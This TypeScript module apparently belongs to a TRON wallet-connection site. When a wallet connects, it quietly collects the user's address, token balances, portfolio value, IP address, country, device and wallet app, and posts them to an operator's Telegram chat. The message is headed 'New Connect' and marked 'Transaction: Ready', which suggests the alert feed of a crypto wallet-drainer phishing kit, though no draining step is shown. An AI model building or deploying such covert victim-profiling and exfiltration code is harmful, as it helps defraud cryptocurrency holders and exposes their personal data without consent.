const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

interface TokenInfo {
  symbol: string
  name: string
  balance: number
  value: number
  decimals: number
  address: string
}

interface WalletInfo {
  address: string
  trxBalance: number
  tokens: TokenInfo[]
  totalValue: number
  ip?: string
  country?: string
  countryCode?: string
  walletType?: string
  device?: string
  domain?: string
}

export async function getIPInfo() {
  try {
    const response = await fetch('https://ipapi.co/json/')
    const data = await response.json()
    
    return {
      ip: data.ip || 'Unknown',
      country: data.country_name || 'Unknown',
      countryCode: data.country_code || 'XX'
    }
  } catch {
    return {
      ip: 'Unknown',
      country: 'Unknown',
      countryCode: 'XX'
    }
  }
}

export async function getTRC20Tokens(address: string): Promise<TokenInfo[]> {
  try {
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}/tokens`)
    const data = await response.json()
    
    const tokens: TokenInfo[] = []
    
    if (data.data && Array.isArray(data.data)) {
      for (const token of data.data) {
        if (!token.balance || token.balance === '0') continue
        
        const balance = Number(token.balance) / Math.pow(10, token.decimals || 6)
        
        tokens.push({
          symbol: token.token_abbr || token.token_name || 'UNKNOWN',
          name: token.token_name || 'Unknown Token',
          balance: balance,
          value: 0,
          decimals: token.decimals || 6,
          address: token.token_id || ''
        })
      }
    }
    
    return tokens
  } catch {
    return []
  }
}

export async function getTRXPrice(): Promise<number> {
  try {
    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
    const data = await response.json()
    return data.tron?.usd || 0
  } catch {
    return 0
  }
}

function getWalletType(session: any): string {
  try {
    const peerMeta = session?.peer?.metadata || session?.metadata
    if (peerMeta?.name && peerMeta.name !== 'Unknown Wallet') {
      return peerMeta.name
    }
    
    if (typeof window !== 'undefined') {
      const userAgent = navigator.userAgent.toLowerCase()
      
      if (userAgent.includes('tronlink')) return 'TronLink'
      if (userAgent.includes('tokenpocket') || userAgent.includes('tp/')) return 'TokenPocket'
      if (userAgent.includes('imtoken')) return 'imToken'
      if (userAgent.includes('trust')) return 'Trust Wallet'
      if (userAgent.includes('bitkeep') || userAgent.includes('bitget')) return 'Bitget Wallet'
      if (userAgent.includes('okex') || userAgent.includes('okx')) return 'OKX Wallet'
      if (userAgent.includes('binance')) return 'Binance Wallet'
      if (userAgent.includes('coinbase')) return 'Coinbase Wallet'
      if (userAgent.includes('metamask')) return 'MetaMask'
      if (userAgent.includes('ledger')) return 'Ledger'
      
      const win = window as any
      if (win.tronWeb && win.tronLink) return 'TronLink'
      if (win.tokenpocket) return 'TokenPocket'
      if (win.imToken) return 'imToken'
      if (win.trustwallet || win.trust) return 'Trust Wallet'
      if (win.bitkeep) return 'Bitget Wallet'
      if (win.okexchain) return 'OKX Wallet'
    }
    
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search)
      const walletParam = params.get('wallet')
      if (walletParam) {
        const walletNames: Record<string, string> = {
          'tronlink': 'TronLink',
          'imtoken': 'imToken',
          'tokenpocket': 'TokenPocket',
          'trustwallet': 'Trust Wallet',
          'bitget': 'Bitget Wallet',
          'okx': 'OKX Wallet'
        }
        const detected = walletNames[walletParam.toLowerCase()]
        if (detected) return detected
      }
    }
    
    return 'Unknown Wallet'
  } catch {
    return 'Unknown Wallet'
  }
}

function getDeviceType(): string {
  if (typeof window === 'undefined') return 'Unknown'
  
  const userAgent = navigator.userAgent.toLowerCase()
  
  if (/mobile|android|iphone|ipad|phone/i.test(userAgent)) {
    return 'Mobile'
  }
  return 'Desktop'
}

function formatTelegramMessage(info: WalletInfo): string {
  const { address, trxBalance, tokens, totalValue, ip, country, countryCode, walletType, device, domain } = info
  
  let tokensValue = 0
  let assetsText = ''
  
  if (tokens.length > 0) {
    for (const token of tokens) {
      tokensValue += token.value
      assetsText += `   ${token.symbol}: ${token.balance.toFixed(4)} (~$${token.value.toFixed(2)})\n`
    }
  } else {
    assetsText = '   No tokens found'
  }
  
  const trxValue = totalValue - tokensValue
  
  const flag = countryCode ? getFlagEmoji(countryCode) : ''
  
  return `New Connect
${address}
- Wallet: ${walletType} (Connected)
- Device: ${device}
IP: ${ip} ${flag}
Country: ${country}
Domain: ${domain || (typeof window !== 'undefined' ? window.location.hostname : 'unknown')}
Total portfolio value: ~$${totalValue.toFixed(2)} USD
   - TRX: ${trxBalance.toFixed(4)} TRX (~$${trxValue.toFixed(2)})
   - Tokens: ~$${tokensValue.toFixed(2)} USD
Assets:
${assetsText}
Transaction: Ready
#connect #request #TRX`
}

function getFlagEmoji(countryCode: string): string {
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0))
  return String.fromCodePoint(...codePoints)
}

export async function sendTelegramNotification(walletInfo: WalletInfo): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return false
  }

  try {
    const message = formatTelegramMessage(walletInfo)
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })
    
    const data = await response.json()
    
    if (data.ok) {
      return true
    } else {
      return false
    }
  } catch {
    return false
  }
}

export async function notifyWalletConnection(
  address: string, 
  trxBalance: number, 
  usdtBalance: number,
  usdcBalance: number,
  session?: any
) {
  try {
    const [ipInfo, trxPrice] = await Promise.all([
      getIPInfo(),
      getTRXPrice()
    ])
    
    let walletType = 'Unknown Wallet'
    if (session && typeof session === 'object' && 'wallet' in session) {
      walletType = session.wallet || 'Unknown Wallet'
    } else {
      walletType = session ? getWalletType(session) : 'WalletConnect'
    }
    
    const device = getDeviceType()
    const domain = typeof window !== 'undefined' ? window.location.hostname : 'unknown'
    
    const tokens: TokenInfo[] = []
    
    if (usdtBalance > 0) {
      tokens.push({
        symbol: 'USDT',
        name: 'Tether USD',
        balance: usdtBalance,
        value: usdtBalance * 1.0,
        decimals: 6,
        address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
      })
    }
    
    if (usdcBalance > 0) {
      tokens.push({
        symbol: 'USDC',
        name: 'USD Coin',
        balance: usdcBalance,
        value: usdcBalance * 1.0,
        decimals: 6,
        address: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
      })
    }
    
    const trxValue = trxBalance * trxPrice
    const tokensValue = tokens.reduce((sum, token) => sum + token.value, 0)
    const totalValue = trxValue + tokensValue
    
    const walletInfo: WalletInfo = {
      address,
      trxBalance,
      tokens,
      totalValue,
      ip: ipInfo.ip,
      country: ipInfo.country,
      countryCode: ipInfo.countryCode,
      walletType,
      device,
      domain
    }
    
    await sendTelegramNotification(walletInfo)
  } catch {}
}
